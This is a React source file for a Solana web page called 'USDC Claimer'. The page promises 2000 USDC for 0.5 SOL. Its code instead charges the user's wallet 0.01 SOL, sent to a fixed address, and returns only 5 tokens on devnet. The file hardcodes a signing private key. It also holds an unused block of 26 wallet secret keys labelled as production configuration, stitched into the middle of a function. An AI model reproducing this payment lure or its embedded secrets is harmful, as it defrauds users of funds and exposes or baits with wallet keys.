/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5R9Y7dQxRg2aDv8itYWdrSBN4KvjrM9xT53BafKz6JZff8WzTSfx81s2qhohtwurPXWSES94pVcADKNXdkbvCNkk"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4HNgF1H5Fx9kteag8uiJSfbf6D7fUu9hbY2BhCHtFAfom2FYK9XPTrSckSdKntQdky5AisXFMbPcx1HTfasMMp7G",
  "key1": "2wG7g8UbMomoaQkaAdCttsLVsyc5P9vwZejDJsoCRpHBV6XLw2nGg5TyjMhxNSxEsDFJb6eeYoyonfYHQVfjZUki",
  "key2": "q3pXEqvVBeKm4EP4EvgFvrZnczNSDB5uzkjgS3q6UVaVQuomwTF6dZCYBjBH7LnYFfs4dyt4HxHvbFQNYUJ5AF6",
  "key3": "4shBcV2x2Bv7PkPCB2d61NE5VPuJ59GUxFBsciZvnXXWvx8DjP6nfEbhceJMkUvG5bSXK3KCu8nJy47U3XREJAU",
  "key4": "GDaJbyikpwCmZWqWmuMDS7nfPo46dSU4avcQc1Q88iRMDDoxRzr9wqD9pYUSGtm38yV7g3CzesRc1byZquXTrGK",
  "key5": "24ACNq1TZQad1BoZn3uBHfueH4ZtXcWGtWcNZ5kdfju2hPLNeGYSQGkZgpMVg9QUTWmv7MByFgdn3N3cqrMZkGmE",
  "key6": "3iUe4S2YVFmRifxaNTwpiKLtotsobJ62ipTfcVCL4bgVUocF4Vr9tyQF2FKR5zMZiD3RoY6EdvK41X9vNKomBHqf",
  "key7": "4EA9BTP7jjjky86Hhx4g285zW5z1Cb1GV1vChDsrFZiBZGsM7KJ2in1VsW5qV7hCDaBKrZNcyeTV1mkYr9j95zMf",
  "key8": "2KsJ7hdUQ9a1zgXYxBvM1Vf18d2cjEksfd66mJrqVDGu4bGukwk3VYDiapbbDxjFadeZA6UaonKDS5LUBP1tgkD3",
  "key9": "3BX6NU9Su4N6FLVS2vjAwY7xFQASXqKLsA98TLtk87dxrjQc9jgfg8j7kg8UjYw3ekK9rFvJGus2RjnghujL82A4",
  "key10": "3C48J6JSP9q1tGHhwKUAr4Skh5PbYQ1QLq1eB8hKB5BhfcniKDtcesN8iPruaPsfDNvsEb4ybtJPyisByGZMet4a",
  "key11": "5AqJnCgQk5w1NBtiZUuJjNDcEFLKfRd9JxAXzn2f2gd52HironcEJtmPEu6hAtLoCx1i4fwPdSUzJmcS14aYgRFJ",
  "key12": "25gz2htox3phA5uirTTDXZ1XtPrsVRvpL1MQhFKLbzqnwYowo5XwomM1TUytv4BZjS9X5NZQoQg3msqefZkXWTRT",
  "key13": "3eTv6LZxBbRjTsLBkmToLydshkq8xUHzaFdQuYJqpV8PmEBY9paK761rb9Uoxp8M1izzgtqWMxdb8uSzy1YoeNZT",
  "key14": "5CkEy7xNfes34MWhUxYfe1ZCpMMuPJLhMFFK64wtgZ5naMsR3wiiiYycRTu2AnVuF2KqmDgUPH7B3E3EDQJng1PQ",
  "key15": "3YDv3XV9a4QoNENxGJHrQ6JuppRhygJHXxGWzSf7sj5BHgef4FB8crXPdq668Jrvg2MnWK3xAXH35L4W3aYHg3qV",
  "key16": "2KgJ5fn2mpcqC1D82nYoA8j4PZeXdyjpaoHeVfxiFRhMVtz1LksJ6xkhZcrTYAzY54XXfaZuMszvtdL8MuB91L2Z",
  "key17": "29h2qeHA6WPJnvqXvRjncG269p91UKEP6JV65ZBCc44GYvJLpUYqET6kQvnNwWhLVyy9TyAyap5JB5SrMQZjH8W2",
  "key18": "3wdH85EWechk3BAPwXBeQZgJ4EvnmUkUq7wGytEGwLXToJVHfZNZYobewM7ExZ3GapxcBkDgxjBkRLYi9A6huWEm",
  "key19": "39in2saVCQkkrzmhsvMPwbC7eQUR9dKp1e3izXyzLfCTmqYs4gkMNcXYK5uXRmjTui62D9yAHmAVZWmWPNxqTdzb",
  "key20": "4DiqYgj7P6LpDz2p7xHo5f1p1rNAU5Tu745R4vdzor1tekzEL1J5HJcfqFe6aZNha2Yun7H5XTRYYZFzsjrDNEN5",
  "key21": "5a6mzJ4m3Wt8bC7igiUyD4QfjuMZBXXiXyrLECpvVFpJXjAJA6gHRFbJsbNjWYSjXyXT86GcBdvfsyfWyXkMMxJu",
  "key22": "LKoUq1Ypvqvkrxs2YawVYmEsTn4Vvb2MSizhZT7yEuWLevXCp1UnAcLPZ8DKy9xfmLekvkP2vq2emZL3wbMTgoe",
  "key23": "5gLrcmMRVpU1NDHRVf8oPpWFXcpMJZ8dJ7LMEDcc6n7q2UL7kWocFowi7bPLFZJEntfRJnj5Fgm33myw7X91qLR1",
  "key24": "4K8JKPLQQjvgFa7UWsNU2Gcw5zXxv92y6pYBKb5gcvsbVUNjHANXaEtPDS4bFKn3Bb9rJkqkwqd7sxDtZsmNBmiY",
  "key25": "JNSuBofjiaEiRSDu37YpDpgLGkDGYKQW9RyVLB6BKKXDNd2RMtgfvUWh1AhLvRioesxnWFDGKN4ymgAxxPvpM1t"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
